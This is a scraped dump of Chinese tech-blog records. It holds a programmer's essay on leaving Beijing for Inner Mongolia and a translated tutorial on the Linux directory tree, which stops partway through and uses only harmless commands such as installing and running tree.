-->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux,Vim", "url": "http://blog.jobbole.com/114132/", "url_obj_id": "a00b9ec8e1a1878cf2a49e643d90596d"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/career.jpg"], "title": "IT程序员的抉择：我要离开帝都了", "create_date": "2018/06/21 ·", "praise_num": 1, "fav_num": 0, "comment_num": 3, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/mazhimazhi/p/9190218.html\">做我自己的主人</a>   </div><div id=\"cnblogs_post_body\">\n<p>不知不觉在北京已经漂泊了近5年了，共为3家公司打过工，其中有几十人的小公司，也有几万人的大公司。随着工作技能的提升和工作经验的积累，薪水自然也涨了不少，但是看着北京的房价、物价飞涨，感觉自己赚多少都是小钱，还不如尽早卷铺盖回内蒙老家发展。那里毕竟是老家，亲戚朋友相对多一点。随着年龄的增长，也想有个自己的家了。</p>\n<p>之前犹犹豫豫的好长时间，不知道自己是留是走，今天还是详细的罗列了两个地方发展的坏处：</p>\n<h3>呆在北京坏处：</h3>\n<p>（1）工作压力大</p>\n<p>尤其是互联网公司，研发需求还是比较多的，有些需求还比较急，清闲的时候少。不过现在觉得还好，技术上有很大的进步，能独立扛事儿，一般的IT研发岗位还是可以得心应手的。</p>\n<p>（2）房价高，落户难</p>\n<p>在北京落户，有一套自己的房子，这想都不敢想了。看着日益飙高的房价和近乎不可能满足的帝都落户条件，如果要呆在北京发展，那注定一辈子只能租房了，像我的同学一样，在偏远一点的地方租个小两居，再买个<br>\n15万以下的车代步，总感觉这不是我想要的生活。</p>\n<p>（3）空气差，雾霾严重</p>\n<p>每天吸雾霾，我都不知道的少活多少年了。随着年龄的增长，感觉身体才最重要，尤其是看到认识的人得了重病后更感觉身体的宝贵。如果继续呆在帝都的话，那也只能是天天吸了。</p>\n<p>（4）漂泊孤独感</p>\n<p>没亲戚，只有几个在大学交好的同学，不过现在也都各忙各的，聚的少，大部分时间还是自己一个人。工作这么多年，也少有能交心的同事。一直感觉自己的生活过的并不快乐，也许有个人陪伴会好很多吧。</p>\n<p>（5）离父母太远</p>\n<p>父母已经上年纪了，而且也不希望离他们太远，万一有个病痛啥的，照顾实在不方便。</p>\n<h3>呆在内蒙坏处：</h3>\n<p>（1）知名IT企业少，岗位技术含量低</p>\n<p>去年中旬专门休了年假回内蒙面试了几家IT公司，挑来挑去还是选择回京继续工作。主要是外包的多，充其量也就给企业做定制化软件，有的还要求驻场开发，几乎没有做自家产品的。这种性质的岗位貌<br>\n似也不轻松。</p>\n<p>（2）薪水低</p>\n<p>薪水和帝都比起来，都不能用腰斩来形容了，要1万都觉得太多，这个心理落差的承受，而且内蒙还不是强制单位上五险一金，所以只有2家公司有五险一金，而且按最低额度缴纳。如果没有房贷，车贷，这个薪水也不是不能接受。这些年在北京也赚了一点钱，再找父母凑点，房子还是能勉强买的起的。</p>\n<p>（3）容易不满足现状，不甘心</p>\n<p>如果岗位技术含量低，而且活儿还多的话，肯定干不长久。而且本人很喜欢技术，很爱在技术上玩儿点高端的。哎，实在不行就自个儿干吧，写写技术书，录录网络课程啥的，相对来说即能选择性学习一些<br>\n感兴趣的技术，又不至于饿死吧。</p>\n<p>（4）空气干燥，对某些植物过敏，容易引发过敏性鼻炎</p>\n<p>内蒙是没有雾霾，但是有沙尘暴，而且为了绿化植被，防止沙漠化，种了一些叫不上名的植物，我很过敏。</p>\n<p>（5）回去容易出来难</p>\n<p>我30出头的年龄，回去肯定要成家的，有家了出来可就难了。</p>\n<p>反正选择在哪个地方发展坏处都不少。但是这么多年在北京奋斗，我感觉除了看上北京的工作机会，就再也没有让我留恋的东西了。我要辞职了，我要离开北京了，再见！2018.6.16</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114136\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114136votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114136\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,职业生涯", "url": "http://blog.jobbole.com/114136/", "url_obj_id": "c4156eb16689abd02ccd4f571b73594d"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux 文件系统详解", "create_date": "2018/07/02 ·", "praise_num": 1, "fav_num": 1, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/blog/learn/intro-to-linux/2018/4/linux-filesystem-explained\">Paul Brown</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9798-1.html\">Linux中国/amwps290</a>   </div><blockquote><p>这篇教程将帮你快速了解 Linux 文件系统。</p></blockquote>\n<p>早在 1996 年，在真正理解文件系统的结构之前，我就学会了如何在我崭新的 Linux 上安装软件。这是一个问题，但对程序来说不是大问题，因为即使我不知道实际的可执行文件在哪里，它们也会神奇地工作。问题在于文档。</p>\n<p>你知道，那时候，Linux 不是像今天这样直观、用户友好的系统。你必须读很多东西。你必须知道你的 CRT 显示器的扫描频率以及拨号调制解调器的噪音来龙去脉，以及其他数以百计的事情。 我很快就意识到我需要花一些时间来掌握目录的组织方式以及 <code>/etc</code>（不是用于“其它”文件），<code>/usr</code>（不是用于“用户”文件）和 <code>/bin</code> （不是“垃圾桶”）的意思。</p>\n<p>本教程将帮助你比我当时更快地了解这些。</p>\n<h3 id=\"toc_1\">结构</h3>\n<p>从终端窗口探索 Linux 文件系统是有道理的，这并不是因为作者是一个脾气暴躁的老人，并且对新孩子和他们漂亮的图形工具不以为然（尽管某些事实如此），而是因为终端，尽管只是文本界面，才是更好地显示 Linux 目录树结构的工具。</p>\n<p>事实上，帮助你了解这一切的、应该首先安装的第一个工具的名为：<code>tree</code>。如果你正在使用 Ubuntu 或 Debian ，你可以：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a815b1e4a8556782199\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt install tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a815b1e4a8556782199-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a815b1e4a8556782199-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a815b1e4a8556782199-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">apt </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a815b1e4a8556782199-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在 Red Hat 或 Fedora :</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a815b1e4b2426590616\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo dnf install tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a815b1e4b2426590616-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a815b1e4b2426590616-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a815b1e4b2426590616-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a815b1e4b2426590616-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>对于 SUSE/openSUSE 可以使用 <code>zypper</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a815b1e4b6579130330\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo zypper install tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a815b1e4b6579130330-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a815b1e4b6579130330-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a815b1e4b6579130330-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">zypper </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a815b1e4b6579130330-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>对于使用 Arch （Manjaro，Antergos，等等）使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a815b1e4ba644815985\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo pacman -S tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a815b1e4ba644815985-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a815b1e4ba644815985-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a815b1e4ba644815985-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">pacman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a815b1e4ba644815985-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>……等等。</p>\n<p>一旦安装好，在终端窗口运行 <code>tree</code> 命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a815b1e4bd090532237\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntree /\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a815b1e4bd090532237-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a815b1e4bd090532237-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a815b1e4bd090532237-1\"><span class=\"crayon-v\">tree</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a815b1e4bd090532237-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>上述指令中的 <code>/</code> 指的是根目录。系统中的其他目录都是从根目录分支而出，当你运行 <code>tree</code> 命令，并且告诉它从根目录开始，那么你就可以看到整个目录树，系统中的所有目录及其子目录，还有它们的文件。</p>\n<p>如果你已经使用你的系统有一段时间了，这可能需要一段时间，因为即使你自己还没有生成很多文件，Linux 系统及其应用程序总是在记录、缓存和存储各种临时文件。文件系统中的条目数量会快速增长。</p>\n<p>不过，不要感到不知所措。 相反，试试这个：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a815b1e4c1089080653\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntree -L 1 /\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a815b1e4c1089080653-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a815b1e4c1089080653-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a815b1e4c1089080653-1\"><span class=\"crayon-v\">tree</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">L</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a815b1e4c1089080653-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>你应该看到如图 1 所示。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/7d8ec1149862c8f94f7abb5f230f2211.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>tree</em></p>\n<p>上面的指令可以翻译为“只显示以 <code>/</code>（根目录） 开头的目录树的第一级”。 <code>-L</code> 选项告诉树你想看到多少层目录。</p>\n<p>大多数 Linux 发行版都会向你显示与你在上图中看到的相同或非常类似的结构。 这意味着，即使你现在感到困惑，掌握这一点，你将掌握大部分（如果不是全部的话）全世界的 Linux 文件系统。</p>\n<p>为了让你开始走上掌控之路，让我们看看每个目录的用途。 当我们查看每一个目录的时候，你可以使用 <code>ls</code> 来查看他们的内容。</p>\n<h3 id=\"toc_2\">目录</h3>\n<p>从上到下，你所看到的目录如下</p>\n<h4 id=\"toc_3\">/bin</h4>\n<p><code>/bin</code> 目录是包含一些二进制文件的目录，即可以运行的一些应用程序。 你会在这个目录中找到上面提到的 <code>ls</code> 程序，以及用于新建和删除文件和目录、移动它们基本工具。还有其它一些程序，等等。文件系统树的其他部分有更多的 <em>bin</em> 目录，但我们将在一会儿讨论这些目录。</p>\n<h4 id=\"toc_4\">/boot</h4>\n<p><code>/boot</code> 目录包含启动系统所需的文件。我必须要说吗？ 好吧，我会说：<strong>不要动它</strong>！ 如果你在这里弄乱了其中一个文件，你可能无法运行你的 Linux，修复被破坏的系统是非常痛苦的一件事。 另一方面，不要太担心无意中破坏系统：你必须拥有超级用户权限才能执行此操作。</p>\n<h4 id=\"toc_5\">/dev</h4>\n<p><code>/dev 目录包含设备文件。 其中许多是在启动时或甚至在运行时生成的。 例如，如果你将新的网络摄像头或 USB 随身碟连接到你的机器中，则会自动弹出一个新的设备条目。</code></p>\n<h4 id=\"toc_6\">/etc</h4>\n<p><code>/etc</code> 的目录名称会让人变得非常的困惑。<code>/etc</code> 得名于最早的 Unix 系统们，它的字面意思是 “etcetera”（诸如此类） ，因为它是系统文件管理员不确定在哪里放置的文件的垃圾场。</p>\n<p>现在，说 <code>/etc</code> 是“要配置的所有内容Everything To Configure”更为恰当，因为它包含大部分（如果不是全部的话）的系统配置文件。 例如，包含系统名称、用户及其密码、网络上计算机名称以及硬盘上分区的安装位置和时间的文件都在这里。 再说一遍，如果你是 Linux 的新手，最好是不要在这里接触太多，直到你对系统的工作有更好的理解。</p>\n<h4 id=\"toc_7\">/home</h4>\n<p><code>/home</code> 是你可以找到用户个人目录的地方。在我的情况下，<code>/home</code> 下有两个目录：<code>/home/paul</code>，其中包含我所有的东西；另外一个目录是 <code>/home/guest</code> 目录，以防有客人需要使用我的电脑。</p>\n<h4 id=\"toc_8\">/lib</h4>\n<p><code>/lib</code> 